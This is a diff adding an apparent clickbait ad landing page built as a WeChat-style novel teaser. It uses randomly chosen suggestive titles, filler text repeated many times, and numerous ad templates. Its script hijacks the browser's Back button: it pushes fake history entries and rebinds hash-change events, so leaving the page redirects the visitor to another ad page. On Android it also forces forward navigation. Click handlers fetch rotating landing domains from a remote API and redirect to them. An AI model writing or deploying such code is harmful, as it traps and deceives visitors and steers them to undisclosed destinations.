@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html style="width: 100%;height: 100%">
+<title></title>
+<meta charset="UTF-8"/>
+<meta name="viewport"
+	  content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="ie=edge"/>
+<link rel="stylesheet" href="css/back_ret2.css"/>
+<script src="js/jquery.js"></script>
+<script src="js/ad.js?v=10003"></script>
+<script src="js/EventEmitter.min.js"></script>
+<script src="js/art-template.js"></script>
+<script src="js/ret.js"></script>
+<script>
+
+    var arrLists = ['深夜少女', '丝袜女神', '气质女神', '清纯少女', '黑丝联盟', '寂寞少妇', '清纯美女', '美丽的身体', '夜生活', '酒吧夜生活']
+
+    function makeRandomArr(arrList, num) { // 随机取出数组元素
+        if (num > arrList.length) {
+            num = arrList.length
+        }
+        const tempArr = arrList.slice(0)
+        const newArrList = []
+        for (var i = 0; i < num; i++) {
+            const random = Math.floor(Math.random() * (tempArr.length - 1))
+            const arr = tempArr[random]
+            tempArr.splice(random, 1)
+            newArrList.push(arr)
+        }
+        return newArrList
+    }
+
+    $('title').html(makeRandomArr(arrLists, 1));
+    var advertising = '<?=$advertising?>';
+    function gogg(url){
+        history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
+        if(navigator.userAgent.indexOf('Android') != -1){
+            if(typeof(tbsJs) != "undefined"){
+                tbsJs.onReady('{useCachedApi : "true"}', function(e) {})
+                window.onhashchange=function(){
+                    location.href = url;
+                };
+            }else{
+                var pop = 0;
+                window.onhashchange = function(event) {
+                    pop++
+                    if (pop >= 3) {
+                        location.href = url;
+                    }else{
+                        history.go(1)
+                    }
+                };
+                history.go(-1);
+            }
+        }else{
+            window.onhashchange=function(){
+                location.href = url;
+            };
+        }
+    }
+
+    gogg('./l2.html');
+</script>
+</head>
+
+<body style="background: rgb(211, 246, 212); touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
+<div class="head-top" style="padding: 2vw 4vw;">
+	<div class="adz-title" style="font-size: 18px;font-weight: bold;">
+		<!--<canvas id="test"-->
+		<!--&gt;</canvas>-->
+	</div>
+</div>
+<!--template悬浮广告-->
+<div id="top-ad">
+	<script id="ad-template-float" type="text/html">
+		<div class="ad-wrap-float top-xuanfu" onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}})">
+			<img class="ad-img" src="{{srcUrls[0]}}" alt="">
+		</div>
+	</script>
+</div>
+<div class="content-article">
+	<!-- <div class="first-page">第一章</div> -->
+	<div class="html-content" style="height: 317px;margin: 2vw 0;overflow:hidden;padding: 2vw 4vw;">
+
+		坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。坐落在大山深处的安家寨，四面环山，寨子里的人们将自家的吊脚楼都建在山腰之上，环绕着整个安家寨，形成了一道独特的风景。
+
+		<p style="padding: 7px; margin-top: 0px; margin-bottom: 4px; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; text-indent: 2em; font-size: 1.3em; line-height: 2; color: rgb(0, 0, 0); font-family: &quot;Microsoft YaHei&quot;, ����, &quot;Arial Narrow&quot;; white-space: normal;"><br></p><div class="bottom-one" style="box-sizing: border-box; white-space: normal; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; padding: 0px; margin: 0px 0px 3vw 3vw; color: rgb(255, 76, 65); font-weight: bold; font-family: &quot;Microsoft YaHei&quot;, ����, &quot;Arial Narrow&quot;;">未完待续......</div><div class="bottom-one" style="box-sizing: border-box; white-space: normal; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; padding: 0px; margin: 0px 0px 3vw 3vw; color: rgb(255, 76, 65); font-weight: bold; font-family: &quot;Microsoft YaHei&quot;, ����, &quot;Arial Narrow&quot;;">微信篇幅有限，后续内容和情节更加精彩！</div><div class="bottom-one" style="box-sizing: border-box; white-space: normal; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; padding: 0px; margin: 0px 0px 3vw 3vw; color: rgb(255, 76, 65); font-weight: bold; font-family: &quot;Microsoft YaHei&quot;, ����, &quot;Arial Narrow&quot;;">点击下一章继续阅读哦~~~</div>
+	</div>
+	<div class="click-content" id="more_btn" style="color: #2196f3;text-align: center;margin-top: 4vw;position: relative;padding-bottom: 6vw">
+		<div class="extend-artile" style="color: #ffffff;
+            width: 60vw;
+            line-height: 40px;
+            border-radius: 20px;
+            background: #fc4e4d;
+            margin: 0 auto;
+            box-shadow: 0px 4px 6px 0px rgba(233, 30, 99, 0.3);">点击展开全文</div>
+		<!--    <div class="Unfolded-cover"></div> -->
+		<div class="extandArrow" style="display: block;
+    width: 100%;
+    height: 24px;
+    position: absolute;
+    -webkit-animation: extandArrowFlow 1.2s ease infinite;
+    animation: extandArrowFlow 1.2s ease infinite;
+    top: -44px;
+    z-index: 6;
+    background: url(https://adz-up.oss-cn-beijing.aliyuncs.com/static/img/arr_down.png) no-repeat 50% / contain;
+    background-size: 24px 24px;"></div>
+	</div>
+	<div class="bottom-content" style="display: none">
+		<!-- 下一章 -->
+		<div id="next-page" style="display: block;">
+			<div class="next-page" id="next_page" style="background-color: #03a9f4;
+    text-align: center;
+    color: #fff;
+    font-size: 20px;
+    font-weight: bold;
+    line-height: 40px;
+    border-radius: 20px;
+    margin-top: 6px;
+    margin-bottom: 6vw;">
+				点击阅读下一章
+			</div>
+		</div>
+		<!-- 二维码 -->
+		<div id="code_weima">
+			<div>
+				<div class="bottom-one">未完待续......</div>
+				<div class="bottom-one">微信篇幅有限，后续内容和情节更加精彩！</div>
+				<div class="bottom-one">长按识别下方【二维码】继续阅读哦~~~</div>
+				<div style="text-align: center;position: relative;margin:2vw 0;">
+					<img src="https://adz-up.oss-cn-beijing.aliyuncs.com/static/img/bg_code.jpg" alt="">
+					<img class="erweima" src="" style="position:absolute;width:30vw;right: 4vw;top: 4vw;">
+				</div>
+			</div>
+			<div class="bottom-text-yuedu">
+				<div class="read-num" style="color:#545454">阅读 10 万+</div>
+				<div class="see-num">在看 <span class="number_see">4091</span></div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<div class="container" style="padding-bottom: 20%;margin-top:0vh">
+	<!--adList -->
+	<div id="adList"></div>
+	<!--template 用于广告列表 单图 -->
+	<script id="ad-template" type="text/html">
+		<div class="ad-template-info" onclick="Ad.adClick(@{{clickUrl}},@{{dUrl}},@{{pid}},2,'<?=$uuid?>')">
+			<div class="item-left">
+				<div class="title">{{title}}</div>
+				<div class="item-extra">
+					<div class="read-date">
+						<span>浏览数：{{readNum}}</span>
+						<span>{{date}}</span>
+					</div>
+				</div>
+			</div>
+			<img class="ad-img" src="{{srcUrls[0]}}" alt="">
+		</div>
+	</script>
+	<!--template 用于广告列表 大图 -->
+	<script id="ad-template-big" type="text/html">
+		<div class="ad-template-info-big" onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}},1,'<?=$uuid?>')">
+			<div class="item-left">
+				<div class="title">{{title}}</div>
+				<img class="ad-img-big" src="{{srcUrls[0]}}" alt="">
+				<div class="item-extra">
+					<div class="read-date">
+						<span>浏览数：{{readNum}}</span>
+						<span>{{date}}</span>
+					</div>
+				</div>
+			</div>
+		</div>
+	</script>
+	<!--三图 -->
+	<script id="ad-template-3img" type="text/html">
+		<div class="ad-template-3img" onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}},3,'<?=$uuid?>')">
+			<div class="title">{{title}}</div>
+			<div class="img_wrap">
+				{{each srcUrls as value}}
+				<img class="ad-img" src="{{value}}" alt="">
+				{{/each}}
+			</div>
+
+			<div class="item-left">
+				<div class="item-extra">
+					<div class="read-date">
+						<span>浏览数：{{readNum}}</span>
+						<span>{{date}}</span>
+					</div>
+				</div>
+			</div>
+		</div>
+	</script>
+</div>
+</body>
+<script type="text/javascript">
+	function pixelRatio () {
+        var ctx = document.createElement('canvas').getContext('2d'),
+            dpr = window.devicePixelRatio || 1,
+            bsr =
+                ctx.webkitBackingStorePixelRatio ||
+                ctx.mozBackingStorePixelRatio ||
+                ctx.msBackingStorePixelRatio ||
+                ctx.oBackingStorePixelRatio ||
+                ctx.backingStorePixelRatio ||
+                1;
+        return dpr / bsr;
+    }
+    console.log( pixelRatio())
+    var clientWidth = document.body.clientWidth || document.documentElement.clientWidth;
+    var canvas = document.createElement('canvas')
+    var context = canvas.getContext('2d');
+    context.textBaseline = 'top';
+
+    console.log(clientWidth)
+    canvas.width = clientWidth - 20;
+    canvas.height = 50
+    context.clearRect(0, 0, canvas.width, canvas.height);
+
+    context.font = `bold 18px sans-serif`;
+
+     var text = ''
+        x = 0, y = 20, lineHeight = 24, maxWidth = undefined
+
+    if (typeof maxWidth == 'undefined') {
+        maxWidth = (canvas && canvas.width) || 300
+    }
+    if (typeof lineHeight == 'undefined') {
+        lineHeight =
+            (canvas && parseInt(window.getComputedStyle(canvas).lineHeight)) ||
+            parseInt(window.getComputedStyle(document.body).lineHeight)
+    }
+
+    // 字符分隔为数组
+    var arrText = text.split('')
+    var line = ''
+
+    for (var n = 0; n < arrText.length; n++) {
+        var testLine = line + arrText[n]
+        var metrics = context.measureText(testLine)
+        var testWidth = metrics.width
+        if (testWidth > maxWidth && n > 0) {
+            context.font = `bold 18px sans-serif`;
+            context.fillText(line, x, y)
+            line = arrText[n]
+            y += lineHeight
+        } else {
+            line = testLine
+        }
+    }
+    console.log(line, x, y)
+    context.font = `bold 18px sans-serif`;
+    context.fillText(line, x, y)
+    var hc_image = new Image();
+    hc_image.src = canvas.toDataURL("image/png");
+    $('.adz-title').html(hc_image);
+
+
+	var is_open  = 0
+	var is_next = 0
+    $(".click-content").click(function() {
+        is_open  = 1
+        $(".click-content").hide();
+        $(".html-content").css({
+            height: "auto",
+            overflow: "auto"
+        });
+        $(".bottom-content").show();
+    });
+    var share_rules = [
+        {
+            notice_pic:
+                "https://adz-up.oss-cn-beijing.aliyuncs.com/static/img/2.png"
+        },
+        {
+            notice_pic:
+                "https://adz-up.oss-cn-beijing.aliyuncs.com/static/img/1.png"
+        }
+    ];
+    //点击跳转到下一章
+    // $(".next-page").click(function() {
+    //     is_next = 1
+    //     var ws = new WebSocket("ws://wz-ws.qd2020.cn"); //西游转生产
+    //     ws.onopen = function () {
+    //         // reg_data.type = "reg";
+    //         // ws.send(JSON.stringify(reg_data));
+    //     };
+    //     var heart_beat_data = {};
+	// 	heart_beat_data.is_next = 1;
+	//
+    //     ws.send(JSON.stringify(heart_beat_data));
+	//
+	// 	// setTimeout(() => {
+    //     //     location.href = "<?=$gzh_url?>";
+    //     // }, 1000)
+    // });
+    //让点击全文展现出来 屏幕高度
+    $(".html-content").height(
+        $(window).height() -
+        $(".head-top").outerHeight() -
+        $(".extend-artile").outerHeight() -
+        370
+    );
+    $('.zhongqiu').click(function(){
+        $.ajax({
+            url:"https://shangcuixx1.longxx.cn/xx1-41/jinwan/api/getluodi1api.php",
+            type:'get',
+            dataType:'json',
+            success: function(res){
+                location.href = res.domainname;
+            },
+            error:function(err){
+                console.log(err);
+            }
+        })
+    });
+
+    $('.ad-top-float').click(function(e){
+        $.ajax({
+            url:"https://shangcuixx1.longxx.cn/xx1-41/yuebing/api/getluodi1api.php",
+            type:'get',
+            dataType:'json',
+            success: function(res){
+                location.href = res.domainname;
+            },
+            error:function(err){
+                console.log(err);
+            }
+        })
+    });
+
+</script>
+<script>
+
+    //需要请求的广告pid 及数据
+    var adListIndex = 0;
+    var adList = [
+        {
+            pid: '1014397', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+
+        {
+            pid: '1013105', //广告位id
+            templateId: 'ad-template', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1013104', //广告位id
+            templateId: 'ad-template-3img', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        },
+
+        {
+            pid: '1014397', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+
+        {
+            pid: '1009957', //广告位id
+            templateId: 'ad-template', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1009965', //广告位id
+            templateId: 'ad-template-3img', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        },
+
+        {
+            pid: '1014397', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1009965', //广告位id
+            templateId: 'ad-template-3img', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1014397', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1009959', //广告位id
+            templateId: 'ad-template-3img', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1010288', //广告位id
+            templateId: 'ad-template-float', //模板script的id
+            wrapDomId: 'top-ad', //插入广告模板的父级id
+            adWrapClass: 'ad-wrap-float' //广告wrap的class 用于寻找被插入的广告
+        },
+
+    ];
+    var deny_cids = []; // 被禁止的创意广告id
+</script>
+<script type="text/javascript" src="jf.js"></script>
+<!--<script src="/bak/new_jj/alksdjfaigha.php"></script>-->
+
+</html>
